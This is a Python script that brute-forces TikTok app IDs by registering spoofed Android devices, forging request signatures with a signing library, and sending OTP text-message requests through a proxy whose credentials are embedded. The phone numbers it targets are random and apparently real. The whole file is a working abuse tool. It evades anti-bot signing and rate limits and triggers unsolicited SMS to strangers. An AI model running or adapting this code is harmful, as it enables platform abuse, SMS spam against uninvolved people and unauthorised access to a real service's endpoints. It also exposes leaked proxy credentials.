"""
AID Brute Force Scanner — SIGNED Mobile Endpoint
Tests AIDs 1 to 10000 with proper v8404 signing + device registration
on multiple tiktokv.com domains.

Uses cross-domain approach:
1. Register device on api3-normal-c-lf.amemv.com
2. Send OTP on random tiktokv.com domain
"""
import requests
import random
import time
import json
import sys
import os
import string
import uuid
import hashlib
import urllib3
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

urllib3.disable_warnings()

# SignerPy
try:
    from SignerPy import sign as sp_sign, xor
    SIGNER_OK = True
    print("SignerPy loaded OK")
except ImportError:
    SIGNER_OK = False
    print("ERROR: SignerPy not available! pip install SignerPy==0.12.0")
    sys.exit(1)

PROXY = 'http://user-2pbGchwGYvoGSTLv-type-datacenter-country-US:j8BogunPuMmSaOEU@geo.g-w.info:10080'
REGISTER_DOMAIN = "api3-normal-c-lf.amemv.com"

# All confirmed reachable tiktokv.com domains
TIKTOKV_DOMAINS = [
    "api16-normal-c-alisg.tiktokv.com",
    "api-t2.tiktokv.com",
    "api-va.tiktokv.com",
    "api16-normal-c-useast2a.tiktokv.com",
    "api16-normal-c-useast1a.tiktokv.com",
    "api16-normal-useast5.us.tiktokv.com",
    "api16-normal-v4.tiktokv.com",
    "api16-normal-v6.tiktokv.com",
    "api16.tiktokv.com",
    "api19-normal-c-alisg.tiktokv.com",
    "api19-normal-c-useast1a.tiktokv.com",
    "api19-normal-c-useast2a.tiktokv.com",
    "api19-normal-useast5.us.tiktokv.com",
    "api19.tiktokv.com",
    "api21-normal-c-alisg.tiktokv.com",
    "api21-normal-c-useast2a.tiktokv.com",
]

# Chinese domains (for Chinese app AIDs)
CHINESE_DOMAINS = [
    "api3-normal-c-lf.amemv.com",
    "is.snssdk.com",
    "api5-normal-c-lf.amemv.com",
]

TYPE_CODES = [3635, 3637, 3634, 3631, 3733, 3734, 3132, 3536]

DEVICE_BRANDS = {
    "Samsung": ["SM-G991B", "SM-S908B", "SM-A536B", "SM-G781B"],
    "Xiaomi": ["M2102K1G", "23013RK75C", "2201116SG"],
    "OnePlus": ["NE2215", "CPH2449"],
    "OPPO": ["CPH2451", "CPH2211"],
    "Google": ["Pixel 7", "Pixel 8 Pro"],
}
ANDROID_VERSIONS = ["11", "12", "13", "14"]
API_LEVELS = {"11": "30", "12": "31", "13": "33", "14": "34"}
BUILD_IDS = ["UP1A.231005.007", "TQ3A.230901.001", "SP1A.210812.016", "TP1A.220624.014"]

# Progress tracking
lock = threading.Lock()
completed = 0
successes = []
rate_limited = []
errors_other = []
errors_403 = 0
errors_16 = 0
errors_network = 0

phones_used = set()
phone_lock = threading.Lock()

def fresh_phone():
    with phone_lock:
        while True:
            prefix = random.choice(['+38050', '+38067', '+38096', '+38097', '+38099',
                                    '+93070', '+93072', '+93073', '+93074', '+93075'])
            p = prefix + str(random.randint(1000000, 9999999))
            if p not in phones_used:
                phones_used.add(p)
                return p

def register_device(aid, app_name, version_code, version_name, package, channel, domain=REGISTER_DOMAIN):
    """Register device to get valid device_id + install_id"""
    brand = random.choice(list(DEVICE_BRANDS.keys()))
    model = random.choice(DEVICE_BRANDS[brand])
    av = random.choice(ANDROID_VERSIONS)
    api_lvl = API_LEVELS[av]
    build_id = random.choice(BUILD_IDS)
    resolution = random.choice(["1080*2400", "1080*2340", "1440*3200"])
    dpi = random.choice(["420", "480", "560"])
    openudid = ''.join(random.choices('0123456789abcdef', k=16))
    cdid = str(uuid.uuid4())
    timestamp = int(time.time())

    reg_params = {
        "aid": str(aid), "app_name": app_name,
        "version_code": version_code, "version_name": version_name,
        "device_platform": "android", "os": "android",
        "os_api": api_lvl, "os_version": av,
        "device_type": model, "device_brand": brand,
        "language": "en", "ac": "wifi", "channel": channel,
        "resolution": resolution, "dpi": dpi,
        "openudid": openudid, "cdid": cdid,
        "ts": str(timestamp), "_rticket": str(timestamp * 1000),
    }
    body = json.dumps({
        "magic_tag": "ss_app_log",
        "header": {
            "display_name": f"App_{aid}",
            "update_version_code": int(version_code),
            "manifest_version_code": int(version_code),
            "aid": aid, "channel": channel,
            "package": package, "app_version": version_name,
            "version_code": int(version_code),
            "sdk_version": "2.14.0-rc.8",
            "os": "Android", "os_version": av, "os_api": int(api_lvl),
            "device_model": model, "device_brand": brand,
            "device_manufacturer": brand, "cpu_abi": "arm64-v8a",
            "release_build": "f66b21c_20241009",
            "density_dpi": int(dpi), "display_density": "xxhdpi",
            "resolution": resolution.replace("*", "x"),
            "language": "en", "timezone": 5, "access": "wifi",
            "not_request_sender": 0, "rom": build_id,
            "rom_version": f"android{av}-release",
            "cdid": cdid, "sig_hash": "aea615ab", "openudid": openudid,
            "clientudid": str(uuid.uuid4()), "region": "US",
            "tz_name": "Asia/Karachi", "tz_offset": 18000, "sim_region": "pk",
        },
        "_gen_ts": timestamp,
    })
    url = f"https://{domain}/service/2/device_register/?{urlencode(reg_params)}"
    ua = f"{package}/{version_code} (Linux; U; Android {av}; en_US; {model}; Build/{build_id}; Cronet/TTNetVersion:b714bfef 2024-09-13 QuicVersion:c459d547 2024-08-27)"

    s = requests.Session()
    s.proxies = {"http": PROXY, "https": PROXY}
    try:
        r = s.post(url, data=body, headers={
            "Host": domain, "User-Agent": ua,
            "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate",
        }, verify=False, timeout=10)
        if r.status_code == 200:
            d = r.json()
            return {
                "device_id": str(d["device_id"]),
                "iid": str(d["install_id"]),
                "brand": brand, "model": model, "av": av,
                "api_lvl": api_lvl, "build_id": build_id,
                "resolution": resolution, "dpi": dpi,
                "openudid": openudid, "cdid": cdid,
                "odin_tt": ''.join(random.choices('0123456789abcdef', k=160)),
                "csrf": ''.join(random.choices('0123456789abcdef', k=32)),
                "package": package, "ua": ua,
            }
    except:
        pass
    finally:
        s.close()
    return None

def test_aid_signed(aid):
    global completed, errors_403, errors_16, errors_network

    # Use musical_ly as app_name for tiktokv domains, aweme for chinese
    app_name = "musical_ly"
    version_code = "350804"
    version_name = "35.8.4"
    package = "com.zhiliaoapp.musically"
    channel = "googleplay"

    phone = fresh_phone()
    tc = random.choice(TYPE_CODES)
    domain = random.choice(TIKTOKV_DOMAINS)

    # Register device on amemv (cross-domain approach)
    dev = register_device(aid, app_name, version_code, version_name, package, channel, REGISTER_DOMAIN)
    if not dev:
        with lock:
            completed += 1
            errors_network += 1
            if completed % 200 == 0:
                print(f"\r  Progress: {completed} | SUCCESS: {len(successes)} | RL: {len(rate_limited)} | 403: {errors_403} | ec16: {errors_16}", end="", flush=True)
        return

    encrypted = xor(phone)
    timestamp = int(time.time())
    rticket = str(timestamp * 1000 + random.randint(1000, 9999))

    common = {
        "passport-sdk-version": "50559",
        "iid": dev["iid"], "device_id": dev["device_id"],
        "ac": "wifi", "channel": channel,
        "aid": str(aid), "app_name": app_name,
        "version_code": version_code, "version_name": version_name,
        "device_platform": "android", "os": "android",
        "ssmix": "a", "device_type": dev["model"],
        "device_brand": dev["brand"], "language": "en",
        "os_api": dev["api_lvl"], "os_version": dev["av"],
        "manifest_version_code": version_code,
        "resolution": dev["resolution"], "dpi": dev["dpi"],
        "update_version_code": version_code,
        "cdid": dev["cdid"], "carrier_region": "PK",
    }

    url_params = dict(common)
    url_params["_rticket"] = rticket
    url_params["ts"] = str(timestamp)
    url_params_str = urlencode(url_params)

    body_params = dict(common)
    body_params.update({
        "auto_read": "0", "account_sdk_source": "app",
        "unbind_exist": "35", "mix_mode": "1",
        "mobile": encrypted, "type": str(tc),
        "_rticket": rticket, "ts": str(timestamp),
    })
    body = urlencode(body_params)

    cookies = f"odin_tt={dev['odin_tt']}; install_id={dev['iid']}; passport_csrf_token_default={dev['csrf']}"

    # Sign with v8404
    try:
        sigs = sp_sign(params=url_params_str, payload=body, cookie=cookies, version=8404, aid=aid)
    except Exception as e:
        with lock:
            completed += 1
            errors_network += 1
        return

    headers = {
        "Host": domain,
        "Connection": "keep-alive",
        "Content-Length": str(len(body)),
        "Cookie": cookies,
        "x-tt-passport-csrf-token": dev["csrf"],
        "X-SS-REQ-TICKET": rticket,
        "sdk-version": "2",
        "passport-sdk-version": "50559",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-SS-DP": str(aid),
        "User-Agent": dev["ua"],
        "Accept-Encoding": "gzip, deflate",
        "X-Gorgon": sigs.get("x-gorgon", ""),
        "X-Khronos": sigs.get("x-khronos", str(timestamp)),
        "X-Argus": sigs.get("x-argus", ""),
        "X-Ladon": sigs.get("x-ladon", ""),
        "X-SS-STUB": sigs.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper()),
    }

    url = f"https://{domain}/passport/mobile/send_code/v1/?{url_params_str}"

    s = requests.Session()
    s.proxies = {"http": PROXY, "https": PROXY}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        msg = d.get("message", "")
        ec = d.get("data", {}).get("error_code") if isinstance(d.get("data"), dict) else None
        desc = (d.get("data", {}).get("description", "") or "")[:50] if isinstance(d.get("data"), dict) else ""

        with lock:
            completed += 1
            if msg == "success":
                successes.append({"aid": aid, "tc": tc, "domain": domain, "phone": phone})
                print(f"\r  *** SUCCESS *** AID={aid} tc={tc} domain={domain} phone={phone}                ")
            elif ec == 7:
                rate_limited.append({"aid": aid, "tc": tc, "domain": domain})
                print(f"\r  ** RATE_LIMITED ** AID={aid} tc={tc} domain={domain}                ")
            elif r.status_code == 403:
                errors_403 += 1
            elif ec == 16:
                errors_16 += 1
            else:
                if ec not in (None, 16, 1105):
                    errors_other.append({"aid": aid, "status": r.status_code, "msg": msg, "ec": ec, "desc": desc})
                    if ec not in (1105,):
                        print(f"\r  ? AID={aid} ec={ec} {desc[:30]}                ")
                elif ec == 1105:
                    pass  # captcha, skip silently

            if completed % 200 == 0:
                print(f"\r  Progress: {completed} | SUCCESS: {len(successes)} | RL: {len(rate_limited)} | 403: {errors_403} | ec16: {errors_16}", end="", flush=True)

    except Exception as e:
        with lock:
            completed += 1
            errors_network += 1
    finally:
        s.close()


def save_results():
    results = {
        "successes": successes,
        "rate_limited": rate_limited,
        "other_interesting": [r for r in errors_other if r.get("ec") not in (None, 16, 1105)],
        "total_tested": completed,
        "errors_403": errors_403,
        "errors_16": errors_16,
        "errors_network": errors_network,
    }
    with open("/home/ubuntu/aid_bruteforce_signed_results.json", "w") as f:
        json.dump(results, f, indent=2)


if __name__ == "__main__":
    START = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    END = int(sys.argv[2]) if len(sys.argv) > 2 else 10001
    WORKERS = int(sys.argv[3]) if len(sys.argv) > 3 else 15

    aids = list(range(START, END))
    random.shuffle(aids)

    print(f"SIGNED AID BRUTE FORCE: {START} to {END-1} ({len(aids)} AIDs)")
    print(f"Workers: {WORKERS} | Domains: {len(TIKTOKV_DOMAINS)} tiktokv.com")
    print(f"Register on: {REGISTER_DOMAIN} | Sign: v8404")
    print(f"Proxy: US datacenter")
    print("=" * 70)

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {executor.submit(test_aid_signed, aid): aid for aid in aids}
        try:
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
        except KeyboardInterrupt:
            print("\n\nInterrupted! Saving partial results...")

    elapsed = time.time() - start_time

    print(f"\n\n{'='*70}")
    print(f"SIGNED BRUTE FORCE COMPLETE: {completed} AIDs in {elapsed:.0f}s ({completed/max(elapsed,1):.1f} req/s)")
    print(f"{'='*70}")

    print(f"\n*** SUCCESSES ({len(successes)}) ***")
    for s in successes:
        print(f"  AID={s['aid']} tc={s['tc']} domain={s['domain']} phone={s['phone']}")

    print(f"\n** RATE LIMITED ({len(rate_limited)}) — working but IP throttled **")
    for r in rate_limited:
        print(f"  AID={r['aid']} tc={r['tc']} domain={r['domain']}")

    interesting = [r for r in errors_other if r.get("ec") not in (None, 16, 1105)]
    if interesting:
        print(f"\n? OTHER INTERESTING ({len(interesting)}) ?")
        for r in interesting:
            print(f"  AID={r['aid']} ec={r['ec']} {r.get('desc', '')[:40]}")

    print(f"\n  403 (signature rejected): {errors_403}")
    print(f"  ec=16 (no permissions): {errors_16}")
    print(f"  Network errors: {errors_network}")
    print(f"  Total tested: {completed}")

    save_results()
    print(f"\nResults saved to /home/ubuntu/aid_bruteforce_signed_results.json")
